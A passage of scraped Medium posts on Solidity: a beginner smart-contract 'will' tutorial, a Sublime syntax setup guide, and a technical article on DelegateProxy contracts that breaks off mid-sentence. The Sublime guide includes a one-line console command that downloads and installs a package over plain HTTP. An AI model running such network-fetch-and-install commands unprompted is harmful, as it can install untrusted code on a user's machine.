cryptoZombies.events.Transfer. We would still use cryptoZombies.methods for everything else we've covered in this lesson.In the future, this won\u2019t be necessary when MetaMask updates their API to support Web3.js 1.0 \u2014 but for right now it\u2019s a necessary stop-gap if we want to start using the nicer Web3.js 1.0 syntax for subscribing to events.\u2764\ufe0f Like, Share, Leave your commentIf you like this post, don\u2019t forget to like, share with your friends and colleagues and leave your comment below about the post.And Follow me\u2026\u2026.", "responses": 4, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Web3", "Tutorial"]}, {"title": "Introduction to Solidity Programming and Smart Contracts (For Complete Beginners)", "post_link": "https://medium.com/coinmonks/introduction-to-solidity-programming-and-smart-contracts-for-complete-beginners-eb46472058cf?source=search_post", "author_name": "Etienne Dusseault", "author_link": "https://medium.com/@etienne.dusseault", "publish_date": "2018-08-05", "last_modified_date": "2019-04-14", "readtime": "12.8", "claps": 833, "voters": 89, "content": "Introduction to Solidity Programming and Smart Contracts (For Complete Beginners)Okay wait, slow down\u2026 What exactly is solidity and what makes these contracts so \u201csmart\u201d?Etienne DusseaultFollowAug 5, 2018 \u00b7 13 min read**ATTENTION** \u2192 UPDATED April 14th 2019 for Solidity 0.5.7Solidity is a brand new programming language native to Ethereum, the second largest cryptocurrency by market capitalization, initially released in 2015. Ethereum is not only a cryptocurrency capable of storing value or making payments, but a fully fledged platform for creating what\u2019s known as a smart contract.For all intents and purposes, a smart contract is a programmable escrow of sorts, an independent middleman or a fair judge capable of managing a financial transaction between various parties and autonomously arbitrating a dispute.What does this all mean?Say a grandfather who is in his last years wants nothing more than to have his inheritance delivered down to his family through means of a will when he passes. In a traditional will, it would be clear who gets what, how much and when, solidified in a legally bound document. When the time comes to actually distribute the sauce, a judge from a court of law needs to revise the document and make decisions accordingly. A common problem that arises within families is an argument about who gets what, creating tension at best and destroying relationships at worst. During the court hearing, This could influence the decision of the judge, which in turn could produce unfair results and possibly create further damage to family bonds.So that being said, what if we could streamline this process by drastically reducing this problem?If the will was a smart contract, a judge would not be necessary. Here\u2019s where it gets awesome. Gramps can actually make the contract hold assets on his behalf, and have them programmatically released to his liking after his passing. In this scenario, the code written in the contract itself would dictate the outcome, effectively eliminating the need for an arbitrator. Sarah gets $10,000, Ben gets $5,000 and Julia gets $2,000. The code executes and the assets in the form of a token or cryptocurrency get automatically distributed to these parties without the need for human intervention. While everyone involved may not be happy with the outcome, nobody can really argue with lines of code on a screen. Sounds practical, right?Keeping this example in mind, let\u2019s get to the part you\u2019ve all come here for. In this lesson we will build gramps a simple will through a smart contract written in solidity.Set up the EnvironmentHead over to Remix. This will serve as the development platform for writing your first smart contract. Your screen should look like this or something similar:Head over to the top left dropdown \u201cEnvironment\u201d and make sure \u201cJavascript VM\u201d is selected. This means that all the code will run as a standalone, and not interact with the actual Ethereum network in any way. Click the + icon in the top left corner to create a new file, and call it \u201cwill.sol\u201d. A tab will appear at the top which represents which file is currently being edited.2. Define the VersionIn solidity, the first line must always state its current version. Is should look like this:Version at the time of writing: 0.5.73. First ContractSkip a line and type the following:Each new contract must be prepended with \u201ccontract\u201d, then the name with the first letter always capitalized, followed by open/close curly brackets to contain the logic. Use a double forward slash to write a comment, which is useful for describing for what the code does without altering it.4. Global Variables and the ConstructorBefore we start writing code, we should already have the terms of the will clearly defined. Let\u2019s say gramps is leaving behind a fortune of 50 Ethers. 20 will go to his son Conrad and the remaining 30 to his wife Lisa. Realistically, when gramps passes away, an external program would call a function inside the contract to distribute the funds, but we will take care of that ourselves for the purposes of this tutorial. Check the comments section for discussion on this!Let\u2019s start by declaring:The owner of the contractThe amount of fortune left behindA switch that tells us if gramps is still aliveA constructor function that sets these values.Line 5 declares the owner. When declaring variables in solidity, they must be prepended with their type. Owner in this case is of type \u201caddress\u201d which is unique to solidity and represents an Ethereum wallet address. This will be useful later on when calling specific functionality only meant for the owner (gramps).Line 6 will hold the value of the fortune gramps is leaving behind. Its type is a uint or \u201cunsigned integer\u201d which means it can only be a positive number. Solidity has many types, but we will not cover all of them here. They can be found in the official documentation for further reading.Line 7 tells us whether gramps is deceased or not in the form of a boolean value, true or false. It is set to false by default.Lines 9\u201313 is the constructor function. This special function will execute automatically upon the contract\u2019s deployment.The \u201cpublic\u201d keyword is what\u2019s known as a \u201cvisibility modifier\u201d which tells the contract who is allowed to call the function. Public means that the function can be called within the contract and outside of it by someone else or another contract.The \u201cpayable\u201d keyword is what makes solidity truly unique. It allows the function to send and receive ether. The constructor has this modifier so that when we deploy the contract we can initialize it with an ether balance, in this case 50. When the contract receives ether, it will store it in its own address.Here, we set the owner to \u201cmsg.sender\u201d, which is a built-in global variable representative of the address that is calling the function. In this case, it will be us (gramps).The fortune is set to \u201cmsg.value\u201d, which is another built-in variable that tells us how much ether has been sent.Even though isDeceased is set to false by default, it\u2019s set manually here to provide clarity.5. ModifiersModifiers are add-ons to functions that contain conditional logic. For example, I have a function that turns off a light switch and a modifier that states the light switch must be \u201con\u201d. I add the modifier to function so that it can only be called if the switch is \u201con\u201d and will throw an error if the switch is \u201coff\u201d.Line 15 declares the \u201conlyOwner\u201d modifier. If added to a function, it can only be called if the caller (msg.sender) is equivalent to the owner variable as stated above (remember how we set the owner in the constructor). We will need this to allow the distribution of funds, which will be implemented later.The \u201crequire\u201d keyword states that everything written within the following parenthesis must be equal to true or else solidity will throw an error and the execution will stop.The \u201c_;\u201d at the end tells the execution to shift to the actual function after it finishes reading the modifier.Line 20 declares the \u201cmustBeDeceased\u201d modifier. Once added to a function, it can only be called if the value of \u201cisDeceased\u201d is true. We will also use this to allow for the distribution of funds. There is currently no way to set it to true, but we will fix that later.As an aside, we could just write \u201crequire\u201d underneath each function declaration, but using modifiers is a great way to avoid repetition and to reuse code.6. InheritancesNow we must declare how the loot is divided amongst the family members. We will need their public wallet keys (addresses) and their desired allotments.As we stated before, Conrad will receive 20 ETH and Lisa will inherit 30. Let\u2019s create a list to store their wallet addresses and a function that sets the inheritance for each address.Line 25 declares an empty array called \u201cfamilyWallets\u201d for storing the family members\u2019 wallet addresses. This is a list-like data structure in which any element can be indexed and subsequently accessed within it. Notice the keyword \u201cpayable\u201d before the brackets. This allows the address(es) to receive Ether. The square brackets after \u201caddress\u201d indicate it\u2019s an array of items rather than a single variable.Line 27 creates a mapping from an address type to a uint type named \u201cinheritance\u201d for stashing the value of each address\u2019 inheritance. This is a key/value pair data structure in which the key can be called to obtain the value. It\u2019s the equivalent of a \u201cdictionary\u201d in other languages such as Python and Javascript.Line 29 declares the function that adds an address to the array we just created, then sets the inheritance given the address. When we call it, we must provide it with one family member\u2019s wallet address along with their allotted spoils. Notice the \u201conlyOwner\u201d modifier we added to this function. Can you guess why we stuck that in there? (Hint: look at the \u201cpublic\u201d keyword.)Line 30 simultaneously creates a wallet address and appends it to our \u201cfamilyWallets\u201d array given the input parameter \u201cwallet\u201d with \u201c.push\u201d.Line 31 takes the value of the key \u201cwallet\u201d (a parameter) from the \u201cinheritance\u201d mapping we created earlier and sets it to the inheritance given the other parameter, \u201cinheritanceAmount\u201d.Notice how logically these steps connect starting from the first. We created a spot for the wallets and the inheritance to live. The function would then populate those data fields with the information we supply it!7. Show me the MoneyLet\u2019s recap. So far we\u2019ve learned about global variables and their types, the constructor, special keywords such as \u201cpayable\u201d and \u201cpublic\u201d, built-in variables like \u201cmsg.sender\u201d, modifiers and \u201crequire\u201d, arrays, mappings and functions. We\u2019ve built the framework, now let\u2019s tie it all together so we can complete our contract.For the last coding part of the tutorial, we\u2019ll implement a way the family can get paid by looking through each of their addresses and sending them their respective dough.Line 34 declares the \u201cpayout()\u201d function. Note the \u201cprivate\u201d keyword. This visibility modifier is the opposite of \u201cpublic\u201d as we\u2019ve seen earlier on. It permits this function to be called only within the contract as demonstrated on line 42. Security is the primary purpose as it doesn\u2019t allow anyone or any other contract to interact with it. Notice the \u201cmustBeDeceased\u201d modifier tagged on at the end. It\u2019s currently still impossible for this function to execute because of it.Line 35 is a for loop that iterates over the \u201cfamilyWallets\u201d array. The syntax is as follows: Declare a counter variable (i), state the loop\u2019s condition and increment (i) every time one cycle is complete. The code within the block will execute up until the counter is less than the length of the \u201cwallets\u201d array. (i) will start at 0 as stated, the logic will execute, (i) will increment to 1 and the logic will execute again. The cycle repeats until the condition is satisfied. Can you guess how many times it will complete the task? (Hint: look at the array\u2019s length)Line 36 is the actual task we\u2019ve been ranting about the entire lesson. \u201cfamilyWallets[i]\u201d refers specifically to the element located at the i\u2019th position in the \u201cfamilyWallets\u201d array. During the first iteration, we know that (i) is equal to 0. We can thus surmise that we want the first address in the list, as arrays always start at index 0. We then introduce a new call to \u201c.transfer()\u201d on the address we just captured. This is one relatively straightforward global method to transfer value that\u2019s embedded within Solidity. It only takes one argument, the amount we want to send. Being the savvy programmers we are, we came prepared with a data structure that contains the information in question. Can you remember where we kept it? \u201cinheritance[familyWallets[i]]\u201d refers directly to the amount of inheritance we specified in the \u201cinheritance\u201d mapping for again, each element located in the i\u2019th position in the \u201cfamilyWallets\u201d array. Since i= 0 on the first iteration, we want the inheritance of the first address in the list.To summarize, this single line of code transfers funds from the contract\u2019s address to a receiver\u2019s address which is pulled from a list with an amount equivalent to that same address\u2019 inheritance allocation.Lines 40\u201342 is the function that gets called when gramps passes away. Here, we set the value of the variable we declared right at the beginning, \u201cisDeceased\u201d, to true. Notice the repeated use of \u201cpublic\u201d and \u201conlyOwner\u201d keywords. Bearing that in mind, we can finally call \u201cpayout()\u201d to send forth the capital.For the keen eyed readers, you may be thinking \u201cisDeceased\u201d is redundant. Technically you\u2019re correct. We could eliminate \u201cdeceased()\u201d all together and change \u201cprivate\u201d to \u201cpublic\u201d & \u201cmustBeDeceased\u201d to \u201conlyOwner\u201d in \u201cpayout()\u201d. It would produce the exact same results. This switch simply aims to explore another means of implementation in which we practice utilizing modifiers. It\u2019s common practice to make functions private and have them called by a public function elsewhere for security purposes.And we\u2019re done!Actually, not quite\u2026This smart contract is complete, but how do we actually use it? Now we can harvest the fruits of our labour.8. Contract Deployment & InteractionYour screen should look like this:Head over the Compile tab in the top right corner. Ensure your compiler version matches the one below (0.5.7), and click Start to Compile.You should see a blue box from Static Analysis. You are welcome to investigate further, but feel free to ignore it for now. Head back to Run.Ensure \u201cJavascript VM\u201d is selected for \u201cEnvironment\u201d. Under \u201cAccount\u201d, clicking the dropdown menu will reveal 5 addresses, each with a 100 ether balance. Select the first one.Deploying a contract to the Ethereum blockchain isn\u2019t free. The deployer must pay a nominal fee known as gas. Such a system is put in place to prevent people from spamming the chain with infinite loops using all the network\u2019s resources without repercussion. If you wish to know more, MyEtherWallet has a comprehensive article on the subject.Leave the \u201cGas Limit\u201d field as is.The \u201cValue\u201d field indicates the amount of ether we want to initialize the contract with when we hit deploy. Enter in 50. Remember how we added a \u201cpayable\u201d modifier to our constructor early on? Go ahead and hit \u201cDeploy\u201d.You should notice 3 things right away. First of all, the balance of the selected account should now read 49.9999\u2026 This is due to the 50 ether we gave to the contract, plus the small fee for deploying it. The console at the bottom will also provide additional details about the deployed instance, feel free to inspect it. The main thing to realize is this:This is our contract instance! It generates its own address and displays the two public functions we created. As the owner, the first thing we want to do it set the inheritances of Conrad (20) and Lisa (30). Let\u2019s say that Conrad\u2019s address is the second one in the dropdown, Lisa\u2019s the third. Select the second one, copy it by clicking the clipboard icon and paste it into the field above.Before we execute, there are a couple of things to keep in mind. If you try to click the shiny button, it will fail. Can you guess why? (Hint: look at our modifiers.) The other caveat here is in the amount. When working with Ether, contracts read the numbers in Wei, which is a tiny fraction of Ether. So tiny in fact, that one ETH is equal to 1x10\u00b9\u2078 Wei. (That\u2019s 1,000,000,000,000,000,000). Luckily, theres a tool that does the conversion for us.Separate the address with a comma and paste in the value of 20 Ether in Wei. To answer the above question, make sure the first address in the dropdown is selected, not the second. Any other address won\u2019t work because of the \u201cOnlyOwner\u201d modifier! (Whichever one is selected during deployment is crowned owner due to \u201cowner = msg.sender\u201d)Let\u2019s launch the rocket and repeat the same steps for Lisa. You should see the console outputting success messages. Inspect them and look for a section labeled \u201cdecoded input\u201d.As you can see, it displays the inputs we provided it.The estate is set, but the sad news is in. Gramps has passed away of a heart attack during an arctic exploration expedition at the age of 73. He was an ambitious man, always full of energy. He grabbed life by the balls at every corner and didn\u2019t take no for an answer. This dude even invested in crypto during the 2017 bull run and made some bank. He knew this day would come so he packed his winnings into the will and wished a prosperous life to his loved ones.As we commemorate the death of a great man, we also call \u201cdeceased()\u201d in his will. The console will smile, and the addresses will increase in balance. Keep in mind here that the account will have to spend some gas to execute the function. Open the dropdown menu and indulge in your success. Yes, you\u2019ve just created your first fully functional smart contract! Go treat yourself to some ice cream, you deserve it!If you\u2019ve made it this far, you yourself are an exceptional human being. Maybe by the time you hit your last days, this technology will be mainstream and you can create your own an autonomous estate manager for your loved ones.To terminate this tutorial, we must discuss one last question, one you may have been wondering throughout the journey. How on earth is gramps suppose to call the function if he\u2019s dead?!? A futuristic solution would be to somehow have an IOT device that can remotely track a heartbeat that would have the power to execute the function if the beat stopped for more than x amount of time. Any other solution you can think of? Post it in the comments!-EtienneFor the thumbnail!", "responses": 11, "tags": ["Ethereum", "Solidity", "Tutorial", "Smart Contracts", "Programming"]}, {"title": "Ethereum-Solidity language syntax in Sublime", "post_link": "https://medium.com/coinmonks/ethereum-solidity-language-syntax-in-sublime-1532e6f3646d?source=search_post", "author_name": "Abhinav Prakash", "author_link": "https://medium.com/@abhinavpraksh", "publish_date": "2017-08-07", "last_modified_date": "2018-12-10", "readtime": "1.46", "claps": 889, "voters": 86, "content": "Ethereum-Solidity language syntax in SublimeAbhinav PrakashFollowAug 7, 2017 \u00b7 2 min readI personally like Sublime as a text-editor more compared with all other existing text editors (including Vim, yes I said it \u2014 sue me), exception is JetBrains ones. Other than Python for which I use Pycharm, Sublime is my default. Before taking on programming on blockchain, Ethereum\u2019s EVM specifically, one needs some foundation of solidity language which the existing documentations make decent effort to explain. It is always there is add and expanded upon.Since I personally like to use Sublime, following are the steps to add Solidity language syntax on Sublime text editor.Step 1: Install Package ControlsPackage Control is a package manager for Sublime Text 2, 3. Open Sublime\u2019s console.View -> Show ConsolePaste the following code in the console and hit returnimport urllib.request,os,hashlib; h = 'df21e130d211cfc94d9b0905775a7c0f' + '1e3d39e33b79698005270310898eea76'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by)Step 2: Restart Sublime and Install PackageRestart Sublime after Package Control installation. Open the Package Control by:Cmd + Shift + PType Install and choose:Package Control: Install PackageWait a few seconds before Sublime gives options of packages to install. Type \u2018Ethereum\u2019 and off you go.Restart Sublime and get cracking.", "responses": 10, "tags": ["Web Development", "Solidity", "Sublime", "Ethereum", "Tutorial"]}, {"title": "Solidity DelegateProxy Contracts", "post_link": "https://blog.gnosis.pm/solidity-delegateproxy-contracts-e09957d0f201?source=search_post", "author_name": "Alan Lu", "author_link": "https://blog.gnosis.pm/@alanlu1023", "publish_date": "2018-05-17", "last_modified_date": "2018-06-20", "readtime": "25.1", "claps": 895, "voters": 87, "content": "Solidity DelegateProxy ContractsAlan LuFollowMay 17, 2018 \u00b7 26 min readNote: This is going to be a pretty technical read. You should be familiar with at least fundamental Ethereum architecture and rudimentary Solidity development before reading this article.Deploying contracts on Ethereum can be really costly. For non-trivial contracts, the amount of gas required can reach into the millions. Factor in an average gas price of 20 GWei, and each contract you deploy may cost you upwards of tens to hundreds of dollars!These deployment gas costs can bar some dApps from reaching a wider audience. Mitigation of these costs using monolithic smart contracts carries the risk of having to maintain a large monolithic smart contract. Splitting logic out into libraries may help, but depending on the problem domain, may not always be the right fit.Furthermore, existing smart contracts may have flaws, or they might need updates to their logic. Proxies can enable contract logic to be updatable as well, so additional business requirements may be implemented after the initial deployment. Of course, this is a tradeoff: contract users would have to trust that the contract owner updates the contract in a way that does not violate user expectations. However, there are ways to reduce the amount of trust required from users during updates.Basic Contract Deployment MechanicsLet\u2019s imagine that we develop contracts for a blockchain kombucha company. Our business requires us to create smart contracts for every bottle of kombucha we sell, for reasons. Okay, so we just make up a Kombucha contract:pragma solidity ^0.4.23;contract Kombucha {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);    uint public fillAmount;    uint public capacity;    string public flavor;    constructor(string _flavor, uint _fillAmount, uint _capacity)        public    {        require(_fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }    function fill(uint amountToAdd) public {        uint newAmount = fillAmount + amountToAdd;        require(newAmount > fillAmount && newAmount <= capacity);        fillAmount = newAmount;        emit FilledKombucha(amountToAdd, newAmount);    }    function drink(uint amountToDrink) public returns (bytes32) {        uint newAmount = fillAmount - amountToDrink;        require(newAmount < fillAmount);        fillAmount = newAmount;        emit DrankKombucha(amountToDrink, newAmount);        // this mess of hashes just here to pad out the bytecode        return keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(            keccak256(keccak256(keccak256(keccak256(keccak256(                amountToDrink            ))))))))))))))))))))))))))))))))))))))))))))))))));    }}We compile that contract with optimization enabled, and we deploy it with some parameters like \u201cpeach\u201d, 100, 100\u2026 to find out that it consumes 552,034 gas in deployment. To make things worse, let\u2019s say, in order to get the transaction to go through in a timely manner, we had to set a gas price of 20 GWei, and the price of Ether happens to be about $1000 that day. That means every Kombucha contract costs $11.04 to deploy. Oof, let\u2019s try and make that better.Historical Proxy PatternsBecause of the exorbitant gas costs of putting additional copies of the code onto the blockchain (not to mention the vast inefficiencies involved in doing so), the Ethereum developer community has been searching for methods of reducing deployment costs through deduplication of actual code deployed onto the chain. One approach is to use Solidity libraries to provide a location on chain where the bulk of the logic for objects exists, and have contracts essentially be a location for storing state with thin wrappers around library calls.This is called Library-Driven Development:library KombuchaLib {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);    struct KombuchaStorage {        uint fillAmount;        uint capacity;        string flavor;    }    function init(        KombuchaStorage storage self,        string _flavor, uint _fillAmount, uint _capacity    ) public {        require(_fillAmount <= _capacity && _capacity > 0);        self.flavor = _flavor;        self.fillAmount = _fillAmount;        self.capacity = _capacity;    }    function fill(KombuchaStorage storage self, uint amountToAdd) public {        uint newAmount = self.fillAmount + amountToAdd;        require(newAmount > self.fillAmount && newAmount <= self.capacity);        self.fillAmount = newAmount;        emit FilledKombucha(amountToAdd, newAmount);    }    // ... and etc. for all the other functions}\u2026where the contracts wrap calls to the library:contract Kombucha {    using KombuchaLib for KombuchaLib.KombuchaStorage;    // we have to repeat the event declarations in the contract    // in order for some client-side frameworks to detect them    // (otherwise they won't show up in the contract ABI)    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);    KombuchaLib.KombuchaStorage private self;    constructor(string _flavor, uint _fillAmount, uint _capacity) public {        self.init(_flavor, _fillAmount, _capacity);    }    function fill(uint amountToAdd) public {        return self.fill(amountToAdd);    }    // do same for drink(...) method    function fillAmount() public view returns (uint) {        return self.fillAmount;    }    // same for capacity and flavor accessors}With this approach, deploying the library costs 479,430 gas (~$9.59), and then deploying an instance of the Kombucha contract costs 358,431 gas (~$7.17). Since we only have to deploy the library once, we\u2019ve saved 35% in deployment costs over the long run.Okay, but can we do better? This method still produces a contract with quite a bit of redundancy. For one, the state of the contract has to be contained in a struct now. Both the state and method parameters have to be passed down into the linked library, and method declarations and events are repeated. This repetition is unavoidable for various technical reasons, and this means our contract code is more brittle now. Also, while the gas savings are great, the fact is that we are still deploying quite a bit of \u201cwrapper\u201d bytecode to the chain, since we essentially have to map the function signatures of the library calls to the function signatures of the Kombucha contract calls.Well, turns out we can do better. By dropping down into assembly, we can implement a generic proxy:contract ProxyData {    address internal proxied;}contract Proxy is ProxyData {    constructor(address _proxied) public {        proxied = _proxied;    }    function () public payable {        address addr = proxied;        assembly {            let freememstart := mload(0x40)            calldatacopy(freememstart, 0, calldatasize())            let success := delegatecall(not(0), addr, freememstart, calldatasize(), freememstart, 32)            switch success            case 0 { revert(freememstart, 32) }            default { return(freememstart, 32) }        }    }}(Inheriting proxied from ProxyData may seem like unnecessary indirection right now, but it will come into play later, I promise.)Creating this proxy only costs 111987 gas (~$2.24)! Not only that, but this contract is able to copy the logic of any conventionally written smart contract. Okay, so we\u2019re done now, right? No\u2026 actually that was a bit optimistic, as we\u2019ll soon see.Proxy-friendly Storage LayoutsWe really should give the proxy a test spin before we declare victory. Let\u2019s fire up Remix and try this out on the conveniently embedded JS VM. We\u2019ll first copy over the original Kombucha contract and this Proxy contract code into Remix. Then, we\u2019ll create an instance of Kombucha with a few parameters (say\u2026 \u201cpeach\u201d, 100, 100 again). Then, we\u2019ll use the address of the created Kombucha instance as the _proxied parameter of the Proxy contract. Finally, let\u2019s call the fillAmount accessor:Something weird is going on hereThe generic proxy above seems to produce a nonsensical value when asked about its fillAmount. Why is that the case? The key to understanding that value is knowing about the layout of state variables, and the fact that delegatecalls cause the original contract\u2019s logic to be executed in the context of the proxy\u2019s address, meaning its logic will assume that this proxy\u2019s address has the same storage layout.To sum up storage layouts: Solidity packs fixed-length state variables into 32-byte EVM words in their order of declaration starting at storage slot zero, while dynamic variables use slightly more complex rules for storage.The generic proxy declares a single address of storage: proxied, whereas the Kombucha contract declares two uint256s and a string. Look at the Proxy and Kombucha columns in the following table:Storage layout for various contracts; H(n) is the Keccak256 hash of a big-endian 256-bit integer n; flavor (contents) is actually displaced by about 5.88e+76 slots after adding the state variable `proxied`The proxied address and the fillAmount are forced to occupy the same storage slot, according to the rules of Solidity storage layout. This means that when we tried to access fillAmount, what was actually accessed was the proxied address, interpreted as a 256-bit unsigned integer. You may verify this by looking at the hexadecimal representation of the value returned and comparing that to the address of the original Kombucha contract instance:(Using a Python shell to do hexadecimal conversion)>>> hex(539200072242722497324523172593427911613710757535)'0x5e72914535f202659083db3a02c984188fa26e9f'Ah, the weird fillAmount value and the proxied address match! That means we just have to add another storage variable at the beginning of Kombucha which is an address, and remember that in general, proxies and proxy targets have to have compatible storage layouts (compare the last column of the table above). One way to do that is by prepending the proxied address to the storage layout via inheritance:// Modify the declaration of Kombucha this way// to make it proxy-friendlycontract Kombucha is ProxyData {    // rest of Kombucha contents...}Also, let\u2019s think of this point in this discussion as checkpoint one.Proxy Storage InitializationYou may have noticed that the other storage variables are completely uninitialized for proxies. In the example above, the capacity variable of the proxy when the proxy is viewed as an instance of the Kombucha contract is zero, as that slot is not modified by the Proxy constructor.But the Kombucha constructor does not allow the construction of a Kombucha instance with zero capacity, thanks to the following line:require(_fillAmount <= _capacity && _capacity > 0);// later, capacity is assigned the value of _capacityIn fact, according to this requirement, fillAmount wasn\u2019t even supposed to be greater than capacity, let alone a casted proxy address value (though of course, we can address that by ensuring compatibility between the storage layouts for the Proxy and its target contracts). The point is that the state of the proxy is completely broken, so all of Kombucha\u2019s functionality won\u2019t work correctly on the proxy.That\u2019s pretty lame. We don\u2019t want to limit the proxy to only those contracts that can start off of a completely uninitialized storage, but we also don\u2019t want people arbitrarily changing, for example, the flavor and capacity of different Kombucha instances, especially if it was a business requirement and you wrote the constructor for Kombucha the way you did for a good reason.Additional Proxy Initialization Method ApproachOne way to allow the generic proxy to be applied to contracts which expect a non-empty initial state is to add an init method to the contract:contract Kombucha is ProxyData {    // original declarations...    constructor(string _flavor, uint _fillAmount, uint _capacity) public {        init(_flavor, _fillAmount, _capacity);    }    function init(string _flavor, uint _fillAmount, uint _capacity) public {        require(capacity == 0 && _fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }    // and the rest of Kombucha...}First, notice that the init method is called in the constructor, and is indeed the only method called in the constructor here. Second, note that the implementation of init is almost identical to the original constructor\u2019s implementation. The difference occurs in this line:require(capacity == 0 && _fillAmount <= _capacity && _capacity > 0);We require that the storage variable capacity is unset here because we need to ensure that the init method is executed only once and only when the contract is uninitialized.For the Kombucha contract, the check on the capacity storage variable is enough to enforce those expected init method properties because there\u2019s no way of unsetting the capacity variable after its been set, but in general, different contracts require different ways of enforcing initialization behavior.Also, there is no access control on the initialization method, and indeed, somebody can call the init method before you do if you just directly proxy a Kombucha instance. Implementing access control on initialization would require you to either hardcode your address into the init method or to extend the proxy constructor, since otherwise, you would have to somehow initialize a storage variable to describe the address for which access is granted. There is a way around this though, and we will come back to this initialization approach later in the article.Finally, I\u2019d like to mention that the bytecode deployed using this init pattern is heavier than the bytecode deployed in the original Kombucha because the initialization method is part of the contract code! Normally, constructor logic is executed once to set up the initial contract state, and then that logic is never deployed. By moving that logic to init, we also have to deploy that logic so that it can be called through the proxy to setup state.We\u2019ll refer to the system state now as checkpoint init.Proxy Subclasses and DRY with Multiple InheritanceLet\u2019s return to checkpoint one now. We will try and move the constructor code out of the base class into a proxy subclass so that we can avoid:deploying the base class with the extra initialization methodmodifying the original contract to make sure state initialization only occurs once and only on an uninitialized staterisking having initialization on an uninitialized contract state hijacked by an unauthorized party (though this will be solved on the initialization method based approach soon)We will accomplish this simply by moving the contract constructor code into the proxy. In order to do this successfully, however, the proxy contract will need to be aware of the way contract storage is laid out. This can be expressed by splitting the contract data out into a separate mixin contract:contract KombuchaData is ProxyData {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);        uint public fillAmount;    uint public capacity;    string public flavor;}Then, moving the contract constructor into the proxy is straightforward:contract KombuchaProxy is Proxy, KombuchaData {    function KombuchaProxy(address proxied, string _flavor, uint _fillAmount, uint _capacity)        public        Proxy(proxied)    {        // the body is identical to our original constructor!        require(_fillAmount <= _capacity && _capacity > 0);        flavor = _flavor;        fillAmount = _fillAmount;        capacity = _capacity;    }}contract Kombucha is KombuchaData {        // this is just all the methods of the original Kombucha:    // drink and fill}The order in which parent contracts are declared on the child contracts determines how their storages are laid out, and both the proxy and the implementation contracts have to be aware of the Kombucha contract storage layout. We use inheritance so that storage variables only have to be declared once, and they are automatically laid out accordingly for both full and proxy instances:Note that the KombuchaProxy constructor also has to specify how to construct the Proxy it is subclassing, so in fact, the constructor has an additional parameter: the address of a full instance of Kombucha. Other than accounting for this extra parameter in the proxy constructor and having to separate state variables and type declarations out into a data mixin contract, the code remains essentially the same as the original.Also, note that KombuchaProxy does not include ProxyData twice because Solidity only copies code from each parent contract in a contract\u2019s ancestry at most once into a contract, so using this will not unalign the storage layout. We will be using this fact throughout the rest of this article.We can test this setup by constructing a full Kombucha instance (which takes no arguments now), constructing a KombuchaProxy instance with the address of the full Kombucha instance\u2019s address as the first argument, and finally viewing the proxy as if it was Kombucha:It works!However, the KombuchaProxy instance still contains unnecessary code, namely, the accessors generated for the inherited public state variables declared in KombuchaData:All we should need is the fallback on the proxyUnfortunately, this is not so nicely factored away:contract KombuchaHeader {    event FilledKombucha(uint amountAdded, uint newFillAmount);    event DrankKombucha(uint amountDrank, uint newFillAmount);}contract KombuchaDataInternal is ProxyData, KombuchaHeader {    uint internal fillAmount;    uint internal capacity;    string internal flavor;}contract KombuchaData is ProxyData, KombuchaHeader {    uint public fillAmount;    uint public capacity;    string public flavor;}contract KombuchaProxy is Proxy, KombuchaDataInternal {    // ...}contract Kombucha is KombuchaData {    // ...}We can deduplicate type and event declarations as well as modifier definitions by pulling them out into a common header mixin like KombuchaHeader, but that\u2019s as far as we can factor. We can\u2019t avoid repeating the declaration of state variables that have accessors, so internal and public versions of the variable declarations have to be repeated in separate mixins.Let\u2019s call this point of the discussion checkpoint subclass. Taking this setup out for a test spin makes this happen:Wait, I said I wanted peach flavoredWhy would taking the code for the accessors out of the proxy instance cause the flavor accessor to start failing?Byzantium Hard Fork and EIP 211Look carefully in the generic proxy code and you\u2019ll find some 32s floating around in the assembly section. If you took a detour earlier and read Swende\u2019s commentary on the generic proxy, or if you happen to know the arguments for the delegatecall, return, and/or revert opcodes, you will find that the 32 corresponds to the size in bytes of the data copied from the delegatecall result and returned/reverted. This means that our generic proxy can\u2019t handle return data larger than 32-bytes.In particular, strings are encoded as an EVM 32-byte word of its length followed by its contents zero-right-padded to 32-bytes. Moreover, since it is a dynamic return type, the offset of the string is output in its slot, meaning the first two words are, in order, a uint256(32) for the offset and a uint256 containing the string length. However, all that the proxy passes is the 32-byte word containing the string offset in the return data, but not the length and contents of the string.We can test this theory further by upping the return size in the proxy to 74-bytes:// inside of the Proxy assembly {} section:let success := delegatecall(not(0), addr, freememstart, calldatasize(), freememstart, 74)switch successcase 0 { revert(freememstart, 74) }default { return(freememstart, 74) }And then supplying \u201csupercalifragilisticexpialidocious\u201d as the flavor:Our proxy passed along the 32-byte offset value, and then the 32-byte string length value, but stopped 10 bytes into the actual string contents, giving us \u201csupercalif\u201d. We can resolve this by continuing to bump up the hard-coded return data size in the proxy, but this only makes the proxy more and more expensive as the parameter increases. Also, without the ability to handle different return sizes, our proxies will never be able to act as a generic stand-in for their proxied contracts.Luckily, there is something that can address this: EIP 211. Basically, this proposal extends the existing EVM instruction set with two new opcodes: returndatacopy and returndatasize. It has been accepted and incorporated into the main network since the 